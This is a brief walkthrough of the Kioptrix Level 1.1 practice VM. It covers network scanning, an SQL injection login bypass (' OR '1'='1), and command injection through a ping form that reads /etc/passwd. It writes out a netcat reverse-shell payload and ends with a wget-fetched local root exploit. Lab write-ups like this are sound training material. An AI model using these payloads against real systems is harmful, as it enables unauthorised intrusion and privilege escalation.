title: Kioptrix Level 1.1 Walkthrough

Time to move on to the next challenge labled "Kioptrix 1.1". The first step is to find the target machines IP address. The attacker uses netdiscover to find the new ip.

The ip of the vulnerable virtual machine is 172.16.158.129. The attacker needed to gather more information about the virtual machine so he used nmap to do a basic scan to see which ports are open and what services are running.

Right away he noticed multiple interesting ports to explore. He decided to start with port 80. Port 80 is commonly used for webhosting so he opened up his web browser then pointed it to 172.16.158.129 to see if there are any vulnerable web applications. The attacker finds a login form when he lands on the home page. It appears to be used for administrative purposes.

He was able to log in with a simple SQL injection. 

Login: Admin
Password: ' OR '1'='1

The attacker is brought to another page that allows the use to ping a machine on the network. I wonder if he can run other commands from the same text entry box? He tried pinging local host with cat of /etc/passwd to see what information the forms would post.

Surprisingly, he was able to display the contents of /etc/passwd for later use. This means that further code could possible be entered in this form. The attacker still needed to obtain root. He decided to see if he could obtain a shell in a similar way that he displayed /etc/passwd.

The attacker set up netcat on his host machine to listen for any connections on port 9292 and then entered 127.0.0.1;/usr/local/bin/nc 172.16.158.128 9292 -e '/bin/bash' into the webform. He was able to obtain a shell. However, the attacker still wasnt root.

He found a local root exploit but he needed to get it over to kioptrix. He set up a python simple server to host my exploit.

Then he used wget to get the exploit.

He compiled the exploit, and then ran it. Root obtained!
